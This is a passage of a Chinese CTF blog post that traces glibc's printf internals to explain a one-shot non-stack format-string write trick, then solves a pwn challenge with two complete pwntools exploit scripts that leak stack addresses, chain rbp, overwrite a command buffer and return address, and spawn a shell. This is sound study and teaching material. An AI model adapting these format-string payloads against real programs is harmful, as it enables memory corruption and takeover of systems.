   /* If the width is determined by an argument this is an int.  */\n      if (specs[cnt].width_arg != -1)\n\targs_type[specs[cnt].width_arg] = PA_INT;\n\n      /* If the precision is determined by an argument this is an int.  */\n      if (specs[cnt].prec_arg != -1)\n\targs_type[specs[cnt].prec_arg] = PA_INT;\n\n      switch (specs[cnt].ndata_args)\n\t{\n\tcase 0:\t\t/* No arguments.  */\n\t  break;\n\tcase 1:\t\t/* One argument; we already have the\n\t\t\t   type and size.  */\n\t  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;\n\t  args_size[specs[cnt].data_arg] = specs[cnt].size;\n\t  break;\n\tdefault:\n\t  /* We have more than one argument for this format spec.\n\t     We must call the arginfo function again to determine\n\t     all the types.  */\n\t  (void) (*__printf_arginfo_table[specs[cnt].info.spec])\n\t    (&specs[cnt].info,\n\t     specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],\n\t     &args_size[specs[cnt].data_arg]);\n\t  break;\n\t}\n    }\n```\n\n在这段代码中，`printf_positional` 把相关的参数 保存成了副本。后续对格式化字符串的参数处理，都是通过副本做处理。\n所以说，以第一个`$`符或者`unknown`的字符为界，前面通过`vfprintf_internal` 解析处理，后面通过`printf_positional`处理。\n\n### 小结\n\n如果我们想一次格式化字符串去栈上做任意地址写，需要利用这个特性。假设我们有一个非栈上格式化字符串的机会，栈上存在如下数据：\n$$\n\\begin{flalign*}\nA &=> B => C & \\\\\\\\\nB &=> C & \\\\\\\\\n&\\ldots & \\\\\\\\\nD &=> E &\n\\end{flalign*}\n$$\n如果我们需要修改`D`的值为`F`, 那么我们必须先把`B` 的值改`D`，然后在通过B这个偏移去修改。 假设A 的偏移为8，\n这部分`fmt` 就是 :\n```python\npayload1 = b\"%p\"*6\npayload1 += \"%{}c%hn\".format(D_low-60).encode()\npayload1 += \"%{}c%9$hn\".format(E_low-D_low+60).encode()\n# 如果用$符写，当然不能这么用，因为会使第二次写入失败\n# 以下是反面教材，属于想得很美\npayload2 = \"%{}c%8$hn\".format(D_low).encode()\npayload2 += \"%{}c%9$hn\".format(E_low-D_low).encode()\n```\n\n根据上文的介绍，我们不难理解，printf 在处理这些字符串其实是按顺序来的。第一个`%n`两个payload都是可以修改成功的，但是第二个`%n` payload2 是 写不上的。或者说它其实是往`C`中写了数据。\n因为`$`符，让payload2 在第一个`%n`处就已经把所有的参数都固定了，修改后，栈上是变量，但是后续的写入，不会同步这个变化。而payload1是在第二个 `%n` 才固定参数，这个时候，第9个参数已经变了，所以可以写成功。\n\n# 例题\n\n\n\n## 前言\n\n一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。\n[一次有趣的格式化字符串漏洞利用 | ZIKH26's Blog](https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4)\n开始研究\n\n## ida分析\n\n### main函数\n\n![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png)\n\n功能非常的简单，\n\n1. 循环3次调用talk，需要控制flag的值（后续再看）\n2. atk判断，成功则调用he()\n\n先看he()里有啥。\n\n### he函数\n\n![he函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png)\n\n这里建议看汇编，\n\n1. system的出现，让人思路开朗\n2. command是`-0xe`，也就是要控制`rbp-0xe`\n3. 注意lea 和 mov 的区别，通过这个方法的话，必须要把\"/bin/sh\"写在栈上\n\n一般揣测一下出题人的想法，肯定是最后要返回到这里了。\n\n### talk函数\n\n![talk](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png)\n\n重点来了，\n\n1. 非栈上格式化字符串,每次只读0x20字节\n2. flag初始是0,talk会把它变成1,想办法置0\n3. 返回到了my_read,继续追踪\n\n![my_read](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png)\n\n看看bss段上,这些变量的位置\n\n![bss](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png)\n\natk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.\n\n## 思路分析\n\n1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell\n2.但是，常规的思路，需要的格式化次数不止3次。\n\n> 1. %p泄露栈地址\n> 2. 把rbp链入（因为此题目栈上无`诸葛连弩`，要自己建）\n> 3. 修改啥也不行，没次数了\n\n3.所以笔者在这里用了一些奇怪的方法。\n\n>1. 笔者开始想，因为`i`也是在栈上的，所以我可以修改`i`来增加次数\n>2. 但是，恰因如此，如果修改rbp，那么会影响下次循环对`i`的判断，\n>3. 于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。\n>4. 所以在笔者的精心的构造下，完成了10次格式化字符串的修改。\n>5. 比较重要的就是两个$n的运用。一个把`sh`写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.\n\n4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.\n\n## exp\n\n### 10次格式化字符串\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio,elf=loadfile(\"./pwn\")\n\n\n# 1 leak stack\npayload=b\"%8$p\"\nio.sendafter(\"...\\n\",payload)\nrbp=int(io.recv(14),16)-0x20\n#logv(\"rbp\",hex(rbp))\nrbp_low=rbp & 0xffff\nfmt_low=0x4040c0 & 0xffff\nio.sendafter(\"battle!\",b\"a\"*8)\n\n#2，3 rbp链入,修改rbp \npayload = '%{}c%6$hn'.format(rbp_low).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$hn\\x00'.format(rbp_low+0x38).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n#4,5,6 'sh'写入栈,修改rbp,把rbp+0x3e-4 链入并置0\npayload = '%{}c%8$n\\x00'.format(0x6873).encode() # 1 canshuxieshangl\n\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$hn'.format(rbp_low+0x58).encode()\npayload+= '%{}c%6$hn\\x00'.format((0x38+0xe-4-0x58+0x10000)%0x10000).encode() # 0\nprint(5)\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$n\\x00'.format(0x00).format() # 1\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\n\n######7 把rbp再次链入\npayload = '%{}c%6$hn\\x00'.format(rbp_low).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n#####8 修改rbp 为rbp_low+0x38+0xe\npayload = '%{}c%47$hn\\x00'.format(rbp_low+0x38+0xe).encode()\npayload = payload.ljust(0x20,b'\\x00')\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\ngdb.attach(io,\"b *0x401332\")\n##### 9 把rbp+8 链入\npayload = '%{}c%6$hn\\x00'.format(rbp_low+8).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n##### 10 修改返回地址\npayload = '%{}c%47$hn'.format(0x1274).encode()\nprint(len(payload))\npayload +=b'/bin/sh\\x00'\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\nio.interactive()\n\n\n```\n\n### 优雅至极\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio,elf=loadfile(\"./pwn\")\ngdb.attach(io,\"b *0x401332\")\n\n# 1 leak stack\npayload=b\"%8$p\"\nio.sendafter(\"...\\n\",payload)\n\nrbp=int(io.recv(14),16)-0x20\n#logv(\"rbp\",hex(rbp))\nrbp_low=rbp & 0xffff\nfmt_low=0x4040c0 & 0xffff\nio.sendafter(\"battle!\",b\"a\"*8)\n\n#2 gouzao \npayload =  b\"%p\" * 4 \npayload += '%{}c%hn'.format(rbp_low+0x20-0x4-40).encode()\npayload+= '%{}c%47$hn'.format((0x6873-(rbp_low+0x20)+0xe)).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\n# 3 \npayload = b\"%p\" *4 \npayload+= '%{}c%hn'.format(rbp_low+0x12-40).encode()\npayload+= '%{}c%47$hn'.format((0x1274-(rbp_low+0x38)+0x30+0x10000)%0x10000).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\nio.interactive()\n\n```\n","source":"_posts/格式化字符串研究.md","raw":"---\ntitle: 格式化字符串研究\ntags:\n  - pwn\n  - 非栈上格式化字符串\ncategories:\n  - 学习笔记\ncover: /img/嘿猫猫.png\nmathjax: true\n---\n# 格式化字符串研究--一次性写的秘密\n\n## 相关定义\n\n### __printf \n\n因为printf 函数，会调用__printf函数。我们直接来看该函数\n它在/stdio-common/printf.c 中\n```c\n\nint\n__printf (const char *format, ...)\n{\n  va_list arg;\n  int done;\n\n  va_start (arg, format);\n  done = __vfprintf_internal (stdout, format, arg, 0);\n  va_end (arg);\n\n  return done;\n}\n\n#undef _IO_printf\nldbl_strong_alias (__printf, printf);\nldbl_strong_alias (__printf, _IO_printf);\n\n```\n\n可以看到，它主要就是调用了__vfprintf_internal函数，继续追踪\n\n### vfprintf_internal\n这个文件在/stdio-common/vfprintf_internal.c \n\n#### 宏相关定义\n在148行，有一个宏定义\n```c\n# define vfprintf __vfprintf_internal\n```\n\n还有一个显然是占位符的一个表，看样子,还是有使用顺序的,对应的顺序里找对应的表\n```c\n#define STEP0_3_TABLE\t\t\t\t\t\t\t      \\\n    /* Step 0: at the beginning.  */\t\t\t\t\t      \\\n    static JUMP_TABLE_TYPE step0_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (flag_space),\t\t/* for ' ' */\t\t\t\t      \\\n      REF (flag_plus),\t\t/* for '+' */\t\t\t\t      \\\n      REF (flag_minus),\t\t/* for '-' */\t\t\t\t      \\\n      REF (flag_hash),\t\t/* for '<hash>' */\t\t\t      \\\n      REF (flag_zero),\t\t/* for '0' */\t\t\t\t      \\\n      REF (flag_quote),\t\t/* for '\\'' */\t\t\t\t      \\\n      REF (width_asterics),\t/* for '*' */\t\t\t\t      \\\n      REF (width),\t\t/* for '1'...'9' */\t\t\t      \\\n      REF (precision),\t\t/* for '.' */\t\t\t\t      \\\n      REF (mod_half),\t\t/* for 'h' */\t\t\t\t      \\\n      REF (mod_long),\t\t/* for 'l' */\t\t\t\t      \\\n      REF (mod_longlong),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (mod_size_t),\t\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (mod_ptrdiff_t),      /* for 't' */\t\t\t\t      \\\n      REF (mod_intmax_t),       /* for 'j' */\t\t\t\t      \\\n      REF (flag_i18n),\t\t/* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    };\t\t\t\t\t\t\t\t\t      \\\n    /* Step 1: after processing width.  */\t\t\t\t      \\\n    static JUMP_TABLE_TYPE step1_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (precision),\t\t/* for '.' */\t\t\t\t      \\\n      REF (mod_half),\t\t/* for 'h' */\t\t\t\t      \\\n      REF (mod_long),\t\t/* for 'l' */\t\t\t\t      \\\n      REF (mod_longlong),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (mod_size_t),\t\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (mod_ptrdiff_t),      /* for 't' */\t\t\t\t      \\\n      REF (mod_intmax_t),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    };\t\t\t\t\t\t\t\t\t      \\\n    /* Step 2: after processing precision.  */\t\t\t\t      \\\n    static JUMP_TABLE_TYPE step2_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (form_unknown),\t/* for '.' */\t\t\t\t      \\\n      REF (mod_half),\t\t/* for 'h' */\t\t\t\t      \\\n      REF (mod_long),\t\t/* for 'l' */\t\t\t\t      \\\n      REF (mod_longlong),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (mod_size_t),\t\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (mod_ptrdiff_t),      /* for 't' */\t\t\t\t      \\\n      REF (mod_intmax_t),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    };\t\t\t\t\t\t\t\t\t      \\\n    /* Step 3a: after processing first 'h' modifier.  */\t\t      \\\n    static JUMP_TABLE_TYPE step3a_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (form_unknown),\t/* for '.' */\t\t\t\t      \\\n      REF (mod_halfhalf),\t/* for 'h' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'l' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_unknown),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (form_unknown),       /* for 't' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    };\t\t\t\t\t\t\t\t\t      \\\n    /* Step 3b: after processing first 'l' modifier.  */\t\t      \\\n    static JUMP_TABLE_TYPE step3b_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (form_unknown),\t/* for '.' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'h' */\t\t\t\t      \\\n      REF (mod_longlong),\t/* for 'l' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (form_unknown),       /* for 't' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    }\n\n#define STEP4_TABLE\t\t\t\t\t\t\t      \\\n    /* Step 4: processing format specifier.  */\t\t\t\t      \\\n    static JUMP_TABLE_TYPE step4_jumps[31] =\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      REF (form_unknown),\t\t\t\t\t\t      \\\n      REF (form_unknown),\t/* for ' ' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '+' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '-' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '<hash>' */\t\t\t      \\\n      REF (form_unknown),\t/* for '0' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '\\'' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '*' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for '1'...'9' */\t\t\t      \\\n      REF (form_unknown),\t/* for '.' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'h' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'l' */\t\t\t\t      \\\n      REF (form_unknown),\t/* for 'L', 'q' */\t\t\t      \\\n      REF (form_unknown),\t/* for 'z', 'Z' */\t\t\t      \\\n      REF (form_percent),\t/* for '%' */\t\t\t\t      \\\n      REF (form_integer),\t/* for 'd', 'i' */\t\t\t      \\\n      REF (form_unsigned),\t/* for 'u' */\t\t\t\t      \\\n      REF (form_octal),\t\t/* for 'o' */\t\t\t\t      \\\n      REF (form_hexa),\t\t/* for 'X', 'x' */\t\t\t      \\\n      REF (form_float),\t\t/* for 'E', 'e', 'F', 'f', 'G', 'g' */\t      \\\n      REF (form_character),\t/* for 'c' */\t\t\t\t      \\\n      REF (form_string),\t/* for 's', 'S' */\t\t\t      \\\n      REF (form_pointer),\t/* for 'p' */\t\t\t\t      \\\n      REF (form_number),\t/* for 'n' */\t\t\t\t      \\\n      REF (form_strerror),\t/* for 'm' */\t\t\t\t      \\\n      REF (form_wcharacter),\t/* for 'C' */\t\t\t\t      \\\n      REF (form_floathex),\t/* for 'A', 'a' */\t\t\t      \\\n      REF (form_unknown),       /* for 't' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'j' */\t\t\t\t      \\\n      REF (form_unknown),       /* for 'I' */\t\t\t\t      \\\n      REF (form_binary),\t/* for 'B', 'b' */\t\t\t      \\\n    }\n\n```\n\n#### LABEL (form_number)\n\n```c\nLABEL (form_number):\t\t\t\t\t\t      \\\n      if ((mode_flags & PRINTF_FORTIFY) != 0)\t\t\t\t      \\\n\t{\t\t\t\t\t\t\t\t      \\\n\t  if (! readonly_format)\t\t\t\t\t      \\\n\t    {\t\t\t\t\t\t\t\t      \\\n\t      extern int __readonly_area (const void *, size_t)\t\t      \\\n\t\tattribute_hidden;\t\t\t\t\t      \\\n\t      readonly_format\t\t\t\t\t\t      \\\n\t\t= __readonly_area (format, ((STR_LEN (format) + 1)\t      \\\n\t\t\t\t\t    * sizeof (CHAR_T)));\t      \\\n\t    }\t\t\t\t\t\t\t\t      \\\n\t  if (readonly_format < 0)\t\t\t\t\t      \\\n\t    __libc_fatal (\"*** %n in writable segment detected ***\\n\");\t      \\\n\t}\t\t\t\t\t\t\t\t      \\\n      /* Answer the count of characters written.  */\t\t\t      \\\n      void *ptrptr = process_arg_pointer ();\t\t\t\t      \\\n      if (is_longlong)\t\t\t\t\t\t\t      \\\n\t*(long long int *) ptrptr = done;\t\t\t\t      \\\n      else if (is_long_num)\t\t\t\t\t\t      \\\n\t*(long int *) ptrptr = done;\t\t\t\t\t      \\\n      else if (is_char)\t\t\t\t\t\t\t      \\\n\t*(char *) ptrptr = done;\t\t\t\t\t      \\\n      else if (!is_short)\t\t\t\t\t\t      \\\n\t*(int *) ptrptr = done;\t\t\t\t\t\t      \\\n      else\t\t\t\t\t\t\t\t      \\\n\t*(short int *) ptrptr = done;\t\t\t\t\t      \\\n      break;\t\t\n```\n\n#### LABEL(unknow)\n```c \n\tLABEL (form_unknown):\n\t  if (spec == L_('\\0'))\n\t    {\n\t      /* The format string ended before the specifier is complete.  */\n\t      __set_errno (EINVAL);\n\t      done = -1;\n\t      goto all_done;\n\t    }\n\n\t  /* If we are in the fast loop force entering the complicated\n\t     one.  */\n\t  goto do_positional;\n\n```\n所以继续分析vfprintf 函数\n\n```c\nint\nvfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags)\n{\n  /* The character used as thousands separator.  */\n  THOUSANDS_SEP_T thousands_sep = 0;\n\n  /* The string describing the size of groups of digits.  */\n  const char *grouping;\n\n  /* Place to accumulate the result.  */\n  int done;\n\n  /* Current character in format string.  */\n  const UCHAR_T *f;\n\n  /* End of leading constant string.  */\n  const UCHAR_T *lead_str_end;\n\n  /* Points to next format specifier.  */\n  const UCHAR_T *end_of_spec;\n\n  /* Buffer intermediate results.  */\n  CHAR_T work_buffer[WORK_BUFFER_SIZE];\n  CHAR_T *workend;\n\n  /* We have to save the original argument pointer.  */\n  va_list ap_save;\n\n  /* Count number of specifiers we already processed.  */\n  int nspecs_done;\n\n  /* For the %m format we may need the current `errno' value.  */\n  int save_errno = errno;\n\n  /* 1 if format is in read-only memory, -1 if it is in writable memory,\n     0 if unknown.  */\n  int readonly_format = 0;\n\n  /* Orient the stream.  */\n#ifdef ORIENT\n  ORIENT;\n#endif\n\n  /* Sanity check of arguments.  */\n  ARGCHECK (s, format);\n\n#ifdef ORIENT\n  /* Check for correct orientation.  */\n  if (_IO_vtable_offset (s) == 0\n      && _IO_fwide (s, sizeof (CHAR_T) == 1 ? -1 : 1)\n      != (sizeof (CHAR_T) == 1 ? -1 : 1))\n    /* The stream is already oriented otherwise.  */\n    return EOF;\n#endif\n\n  if (UNBUFFERED_P (s))\n    /* Use a helper function which will allocate a local temporary buffer\n       for the stream and then call us again.  */\n    return buffered_vfprintf (s, format, ap, mode_flags);\n\n  /* Initialize local variables.  */\n  done = 0;\n  grouping = (const char *) -1;\n#ifdef __va_copy\n  /* This macro will be available soon in gcc's <stdarg.h>.  We need it\n     since on some systems `va_list' is not an integral type.  */\n  __va_copy (ap_save, ap);\n#else\n  ap_save = ap;\n#endif\n  nspecs_done = 0;\n\n#ifdef COMPILE_WPRINTF\n  /* Find the first format specifier.  */\n  f = lead_str_end = __find_specwc ((const UCHAR_T *) format);\n#else\n  /* Find the first format specifier.  */\n  f = lead_str_end = __find_specmb ((const UCHAR_T *) format);\n#endif\n\n  /* Lock stream.  */\n  _IO_cleanup_region_start ((void (*) (void *)) &_IO_funlockfile, s);\n  _IO_flockfile (s);\n\n  /* Write the literal text before the first format.  */\n  outstring ((const UCHAR_T *) format,\n\t     lead_str_end - (const UCHAR_T *) format);\n\n  /* If we only have to print a simple string, return now.  */\n  if (*f == L_('\\0'))\n    goto all_done;\n\n  /* Use the slow path in case any printf handler is registered.  */\n  if (__glibc_unlikely (__printf_function_table != NULL\n\t\t\t|| __printf_modifier_table != NULL\n\t\t\t|| __printf_va_arg_table != NULL))\n    goto do_positional;\n\n  /* Process whole format string.  */\n  do\n    {\n      STEP0_3_TABLE;\n      STEP4_TABLE;\n\n      int is_negative;\t/* Flag for negative number.  */\n      union\n      {\n\tunsigned long long int longlong;\n\tunsigned long int word;\n      } number;\n      int base;\n      union printf_arg the_arg;\n      CHAR_T *string;\t/* Pointer to argument string.  */\n      int alt = 0;\t/* Alternate format.  */\n      int space = 0;\t/* Use space prefix if no sign is needed.  */\n      int left = 0;\t/* Left-justify output.  */\n      int showsign = 0;\t/* Always begin with plus or minus sign.  */\n      int group = 0;\t/* Print numbers according grouping rules.  */\n      /* Argument is long double/long long int.  Only used if\n\t double/long double or long int/long long int are distinct.  */\n      int is_long_double __attribute__ ((unused)) = 0;\n      int is_short = 0;\t/* Argument is short int.  */\n      int is_long = 0;\t/* Argument is long int.  */\n      int is_char = 0;\t/* Argument is promoted (unsigned) char.  */\n      int width = 0;\t/* Width of output; 0 means none specified.  */\n      int prec = -1;\t/* Precision of output; -1 means none specified.  */\n      /* This flag is set by the 'I' modifier and selects the use of the\n\t `outdigits' as determined by the current locale.  */\n      int use_outdigits = 0;\n      UCHAR_T pad = L_(' ');/* Padding character.  */\n      CHAR_T spec;\n\n      workend = work_buffer + WORK_BUFFER_SIZE;\n\n      /* Get current character in format string.  */\n      JUMP (*++f, step0_jumps);\n\n      /* ' ' flag.  */\n    LABEL (flag_space):\n   